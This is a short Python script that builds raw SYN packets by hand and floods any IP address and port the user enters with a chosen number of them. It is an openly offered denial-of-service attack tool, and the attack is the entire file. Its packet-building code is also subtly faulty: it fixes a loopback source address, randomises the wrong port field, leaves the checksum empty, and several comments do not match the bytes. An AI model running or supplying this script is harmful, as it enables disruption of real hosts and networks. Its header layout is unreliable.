import socket
import random
import time

def flood_syn_packets(destination_ip, destination_port, num_packets):
    # Create a raw socket
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except socket.error as e:
        print("Socket creation failed with error: {}".format(e))
        return

    # Craft SYN packet
    ip_header = b'\x45\x00\x00\x3c'  # IP version, header length, total length (maximum)
    ip_header += b'\x00\x00\x00\x00'  # Identification, flags, fragment offset
    ip_header += b'\x40\x06\x00\x00'  # TTL, Protocol (TCP)
    ip_header += b'\x7f\x00\x00\x01'  # Source IP address (127.0.0.1)
    ip_header += socket.inet_aton(destination_ip)  # Destination IP address

    tcp_header = b'\x00\x00\x00\x00'  # Source port, Destination port (random)
    tcp_header += b'\x00\x00\x00\x00'  # Sequence number
    tcp_header += b'\x00\x00\x00\x00'  # Acknowledgment number
    tcp_header += b'\x50\x02\x71\x10'  # Data offset, Reserved, Flags (SYN)
    tcp_header += b'\xff\xff\x00\x00'  # Window size, Checksum, Urgent pointer
    tcp_header += b'\x00\x00\x00\x00'  # Options padding

    # Loop to send multiple SYN packets
    for _ in range(num_packets):
        tcp_header = tcp_header[:2] + int.to_bytes(random.randint(1024, 65535), 2, 'big') + tcp_header[4:]
        try:
            s.sendto(ip_header + tcp_header, (destination_ip, destination_port))
        except socket.error as e:
            print("An error occurred when sending the packet: {}".format(e))


# Example usage:
destination_ip = input("Enter the destination IP address: ")
destination_port = int(input("Enter the destination port number: "))
num_packets = int(input("Enter the number of packets to send: "))

flood_syn_packets(destination_ip, destination_port, num_packets)